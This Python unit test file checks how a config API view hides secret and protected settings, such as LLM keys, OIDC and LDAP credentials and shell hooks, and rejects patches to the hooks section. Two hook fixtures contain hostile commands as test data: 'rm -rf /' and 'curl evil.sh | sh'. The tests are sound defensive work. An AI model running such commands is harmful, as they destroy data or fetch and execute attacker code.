"""Unit tests for ``ConfigSchemaView`` against the real ``AppConfig`` schema.

Pure tests — no Flask client, no I/O. They pin the protected/secret contract
the ``/config`` endpoints and the faceted Settings frontend depend on.
"""

from mewbo_api.config_view import ConfigSchemaView
from mewbo_core.config import AppConfig

# The canonical classification, mirrored from config.py's annotation contract.
EXPECTED_SECRET = {
    "llm.api_key",
    "langfuse.public_key",
    "langfuse.secret_key",
    "home_assistant.token",
    "cli.remote.token",  # opt-in remote sync token — write-only
    "api.apps_token_secret",  # Mewbo Apps render-token signing secret — write-only
    "api.auth.session.secret",  # browser session cookie signing secret
    "api.auth.scim.secret",  # bearer secret an IdP presents to the SCIM endpoint
    "speech.api_key",  # key for a speech gateway kept separate from the llm one
    # Credentials on a LIST element. No index segment: the path means "this
    # field, in EVERY authenticator entry" — the representation strip/patch can
    # actually apply while walking a decoded config.
    "api.auth.authenticators.client_secret",
    "api.auth.authenticators.bind_password",
}
EXPECTED_PROTECTED = {
    "api.master_token",
    "runtime.cache_dir",
    "runtime.session_dir",
    "runtime.config_dir",
    "runtime.projects_home",
    "hooks",  # whole section: unsandboxed shell/HTTP hooks, class-level flag (P0 audit fix)
}


def _view() -> ConfigSchemaView:
    return ConfigSchemaView.from_model(AppConfig)


# ---------- classification ----------


def test_protected_paths():
    assert _view().protected_paths() == EXPECTED_PROTECTED


def test_secret_paths():
    assert _view().secret_paths() == EXPECTED_SECRET


# ---------- public_schema ----------


def test_public_schema_removes_protected_keeps_secret_writeonly():
    schema = _view().public_schema()
    defs = schema["$defs"]

    # Protected: master_token + runtime paths are gone entirely.
    assert "master_token" not in defs["APIConfig"]["properties"]
    runtime_props = defs["RuntimeConfig"]["properties"]
    for field in ("cache_dir", "session_dir", "config_dir", "projects_home"):
        assert field not in runtime_props

    # Secret: api_key kept and marked writeOnly so the console can set it.
    api_key = defs["LLMConfig"]["properties"]["api_key"]
    assert api_key.get("writeOnly") is True
    # Other secrets likewise kept + writeOnly.
    assert defs["LangfuseConfig"]["properties"]["secret_key"].get("writeOnly") is True
    assert defs["HomeAssistantConfig"]["properties"]["token"].get("writeOnly") is True


def test_public_schema_removes_class_level_protected_ref():
    """A whole-section flag on a submodel's OWN class (not the field) is honored.

    ``hooks: HooksConfig`` is a bare ``$ref`` at the AppConfig root — sibling
    ``json_schema_extra`` on that field would be dropped by Pydantic, so
    ``x-protected`` lives on ``HooksConfig.model_config`` instead. Regression
    guard for the audit fix: the root's own top-level `hooks` entry must
    disappear, not just entries nested inside `$defs`.
    """
    schema = _view().public_schema()
    assert "hooks" not in schema["properties"]


def test_public_schema_drops_protected_from_required():
    # Build a synthetic schema where a protected field is required, to prove
    # the def's `required` list is pruned.
    schema = {
        "$defs": {
            "Sec": {
                "type": "object",
                "properties": {
                    "keep": {"type": "string"},
                    "gone": {"type": "string", "x-protected": True},
                },
                "required": ["keep", "gone"],
            }
        },
        "properties": {"sec": {"$ref": "#/$defs/Sec"}},
        "type": "object",
    }
    out = ConfigSchemaView(schema).public_schema()
    sec = out["$defs"]["Sec"]
    assert "gone" not in sec["properties"]
    assert sec["required"] == ["keep"]


def test_public_schema_does_not_mutate_source():
    view = _view()
    before = view.protected_paths()
    view.public_schema()
    # Re-deriving from a fresh view yields identical classification (no mutation).
    assert view.protected_paths() == before


# ---------- strip_values ----------


def test_strip_values_drops_protected_and_secret():
    data = {
        "api": {"master_token": "msk-x"},
        "llm": {"api_key": "sk-x", "default_model": "gpt-5.2"},
        "langfuse": {"public_key": "pk", "secret_key": "sk", "host": "h"},
        "home_assistant": {"token": "t", "url": "u"},
        "runtime": {"cache_dir": "/c", "log_level": "INFO"},
        "hooks": {"post_tool_use": [{"type": "command", "command": "rm -rf /"}]},
    }
    out = _view().strip_values(data)

    # Protected values gone.
    assert "master_token" not in out["api"]
    assert "cache_dir" not in out["runtime"]
    assert "hooks" not in out
    # Secret values gone.
    assert "api_key" not in out["llm"]
    assert "public_key" not in out["langfuse"]
    assert "secret_key" not in out["langfuse"]
    assert "token" not in out["home_assistant"]
    # Non-sensitive siblings retained.
    assert out["llm"]["default_model"] == "gpt-5.2"
    assert out["langfuse"]["host"] == "h"
    assert out["home_assistant"]["url"] == "u"
    assert out["runtime"]["log_level"] == "INFO"
    # Source untouched (deep copy).
    assert data["llm"]["api_key"] == "sk-x"


# ---------- secret_status ----------


def test_secret_status_reports_is_set_bools():
    cfg = {
        "llm": {"api_key": "sk-set"},
        "langfuse": {"public_key": "", "secret_key": "sk"},
        # home_assistant.token absent entirely.
    }
    status = _view().secret_status(cfg)
    assert status == {
        "llm.api_key": True,
        "langfuse.public_key": False,  # empty string -> not set
        "langfuse.secret_key": True,
        "home_assistant.token": False,  # missing -> not set
        "cli.remote.token": False,  # missing -> not set
        "api.apps_token_secret": False,  # missing -> not set
        "api.auth.session.secret": False,  # missing -> not set
        "api.auth.scim.secret": False,  # missing -> not set
        "speech.api_key": False,  # missing -> not set (it falls back to llm.api_key)
        "api.auth.authenticators.client_secret": False,  # missing -> not set
        "api.auth.authenticators.bind_password": False,  # missing -> not set
    }


# ---------- list-nested secrets (authenticator credentials) ----------


def _auth_cfg() -> dict:
    """A config whose authenticator list carries both plaintext credentials."""
    return {
        "api": {
            "auth": {
                "enabled": True,
                "authenticators": [
                    {
                        "name": "corp-oidc",
                        "kind": "oidc",
                        "issuer": "https://idp.example.com",
                        "client_id": "mewbo-console",
                        "client_secret": "OIDC-SECRET",
                    },
                    {
                        "name": "corp-ldap",
                        "kind": "ldap",
                        "server_url": "ldaps://ldap.example.com",
                        "bind_dn": "cn=svc,dc=example,dc=com",
                        "bind_password": "LDAP-SECRET",
                    },
                ],
            }
        }
    }


def test_strip_values_removes_credentials_from_every_list_element():
    """The leak: a credential nested in a list was returned in plaintext.

    ``_classify`` had no array arm, so nothing under ``authenticators`` was
    ever marked and every entry's secret rode out of ``GET /api/config``.
    """
    out = _view().strip_values(_auth_cfg())
    entries = out["api"]["auth"]["authenticators"]

    assert "client_secret" not in entries[0]
    assert "bind_password" not in entries[1]
    assert "OIDC-SECRET" not in repr(out)
    assert "LDAP-SECRET" not in repr(out)


def test_strip_values_keeps_non_secret_authenticator_fields():
    """Over-redaction check — the console's settings surface still renders."""
    entries = _view().strip_values(_auth_cfg())["api"]["auth"]["authenticators"]

    assert entries[0]["name"] == "corp-oidc"
    assert entries[0]["kind"] == "oidc"
    assert entries[0]["issuer"] == "https://idp.example.com"
    assert entries[0]["client_id"] == "mewbo-console"
    assert entries[1]["bind_dn"] == "cn=svc,dc=example,dc=com"


def test_secret_status_reports_set_when_any_element_carries_the_credential():
    """Stripping the value leaves is-set as the only channel to the operator."""
    status = _view().secret_status(_auth_cfg())

    assert status["api.auth.authenticators.client_secret"] is True
    assert status["api.auth.authenticators.bind_password"] is True


def test_authenticator_dump_omits_the_credential_its_kind_lacks():
    """A null credential would be a hard boot failure, not cosmetic noise.

    ``api.auth`` is dumped and fed back into the identity kernel's strict
    per-kind union, where an unexpected key is rejected — so an OIDC entry must
    not carry ``bind_password: None``, nor an LDAP entry ``client_secret: None``.
    """
    dumped = AppConfig.model_validate(_auth_cfg()).api.auth.model_dump()
    oidc, ldap = dumped["authenticators"]

    assert "bind_password" not in oidc
    assert "client_secret" not in ldap
    assert oidc["client_secret"] == "OIDC-SECRET"
    assert ldap["bind_password"] == "LDAP-SECRET"


# ---------- reject_protected ----------


def test_reject_protected_flags_protected_allows_secret():
    view = _view()
    # Protected path present -> flagged.
    assert view.reject_protected({"api": {"master_token": "x"}}) == ["api.master_token"]
    # Secret path present -> allowed (no violation).
    assert view.reject_protected({"llm": {"api_key": "sk"}}) == []
    # Mixed payload: only protected paths returned.
    violations = view.reject_protected(
        {"llm": {"api_key": "sk", "default_model": "m"}, "runtime": {"cache_dir": "/c"}}
    )
    assert violations == ["runtime.cache_dir"]


def test_reject_protected_empty_for_clean_patch():
    assert _view().reject_protected({"llm": {"default_model": "anthropic/claude"}}) == []


def test_reject_protected_flags_hooks_patch():
    """A PATCH touching `hooks` at all is a violation, regardless of caller (P0)."""
    view = _view()
    patch = {"hooks": {"post_tool_use": [{"type": "command", "command": "curl evil.sh | sh"}]}}
    assert view.reject_protected(patch) == ["hooks"]


# ---------- resolve_secret_writes ----------


def test_empty_secret_carries_the_stored_value_forward():
    """The clobber: a form hydrated without the value round-trips it back empty."""
    resolved = _view().resolve_secret_writes(
        {"llm": {"api_key": "", "default_model": "anthropic/claude"}},
        {"llm": {"api_key": "sk-live", "default_model": "old"}},
    )

    assert resolved["llm"]["api_key"] == "sk-live"
    assert resolved["llm"]["default_model"] == "anthropic/claude"


def test_empty_secret_with_nothing_stored_drops_the_key():
    """Nothing to preserve, so nothing is written — not an empty string."""
    resolved = _view().resolve_secret_writes({"llm": {"api_key": ""}}, {})

    assert resolved["llm"] == {}


def test_env_reference_survives_untouched():
    """The deployment stores `${VAR}`; carrying it forward must not resolve it."""
    resolved = _view().resolve_secret_writes(
        {"llm": {"api_key": ""}}, {"llm": {"api_key": "${MEWBO_LLM_API_KEY}"}}
    )

    assert resolved["llm"]["api_key"] == "${MEWBO_LLM_API_KEY}"


def test_non_empty_secret_is_written():
    resolved = _view().resolve_secret_writes(
        {"llm": {"api_key": "sk-new"}}, {"llm": {"api_key": "sk-old"}}
    )

    assert resolved["llm"]["api_key"] == "sk-new"


def test_null_secret_clears_it():
    """The one spelling that means erase, distinct from absent and from empty."""
    resolved = _view().resolve_secret_writes(
        {"llm": {"api_key": None}}, {"llm": {"api_key": "sk-live"}}
    )

    assert resolved["llm"]["api_key"] == ""


def test_nested_secret_is_resolved():
    """A secret two levels down (`api.auth.session.secret`) follows the same rule."""
    resolved = _view().resolve_secret_writes(
        {"api": {"auth": {"enabled": True, "session": {"secret": "", "cookie_name": "s"}}}},
        {"api": {"auth": {"session": {"secret": "cookie-key"}}}},
    )

    assert resolved["api"]["auth"]["session"]["secret"] == "cookie-key"
    assert resolved["api"]["auth"]["enabled"] is True


def test_list_element_secret_is_carried_forward_by_index():
    """Dropping the key would not preserve it: a list is merged by REPLACEMENT."""
    patch = {
        "api": {
            "auth": {
                "authenticators": [
                    {"name": "corp-oidc", "kind": "oidc", "client_secret": ""},
                    {"name": "corp-ldap", "kind": "ldap", "bind_password": ""},
                ]
            }
        }
    }
    resolved = _view().resolve_secret_writes(patch, _auth_cfg())
    entries = resolved["api"]["auth"]["authenticators"]

    assert entries[0]["client_secret"] == "OIDC-SECRET"
    assert entries[1]["bind_password"] == "LDAP-SECRET"


def test_new_list_element_secret_is_not_invented():
    """An entry with no stored counterpart has nothing to carry forward."""
    patch = {"api": {"auth": {"authenticators": [{"name": "new", "client_secret": ""}]}}}
    resolved = _view().resolve_secret_writes(patch, {})

    assert resolved["api"]["auth"]["authenticators"][0] == {"name": "new"}


def test_the_patch_argument_is_not_mutated():
    """The caller still holds the request body; the resolution is a copy."""
    patch = {"llm": {"api_key": ""}}
    _view().resolve_secret_writes(patch, {"llm": {"api_key": "sk-live"}})

    assert patch == {"llm": {"api_key": ""}}
